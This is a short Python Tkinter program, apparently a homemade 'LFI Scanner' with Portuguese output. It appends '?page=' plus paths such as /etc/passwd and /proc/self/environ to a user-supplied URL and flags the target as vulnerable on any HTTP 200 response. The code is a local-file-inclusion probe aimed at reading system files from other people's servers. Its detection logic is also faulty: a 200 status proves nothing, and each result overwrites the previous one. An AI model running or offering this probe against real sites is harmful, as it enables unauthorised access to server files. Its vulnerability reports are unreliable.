import tkinter as tk
import requests

def run_scan():
    # get the URL from the user input
    url = entry.get()
    
    # list of files to check for LFI vulnerability
    files = ["/etc/passwd", "/proc/self/environ", "/var/log/apache2/access.log"]
    
    # loop through the list of files
    for file in files:
        # construct the full URL to test
        test_url = url + "?page=" + file
        # make the request to the URL
        response = requests.get(test_url)
        # check the response status code
        if response.status_code == 200:
            # if the status code is 200, the file is accessible
            result_label.config(text=f"[+] VULNERÁVEL: {test_url}")
        else:
            # if the status code is not 200, the file is not accessible
            result_label.config(text=f"[-] Não VULNERÁVEL: {test_url}")

# create the GUI window
root = tk.Tk()
root.title("LFI Scanner")

# create a label for the URL input
url_label = tk.Label(root, text="URL:")
url_label.grid(row=0, column=0, sticky="W")

# create a text entry for the URL
entry = tk.Entry(root)
entry.grid(row=0, column=1)

# create a button to start the scan
scan_button = tk.Button(root, text="Scan", command=run_scan)
scan_button.grid(row=1, column=0, columnspan=2, pady=10)

# create a label to display the result
result_label = tk.Label(root, text="")
result_label.grid(row=2, column=0, columnspan=2, pady=10)

# run the GUI
root.mainloop()
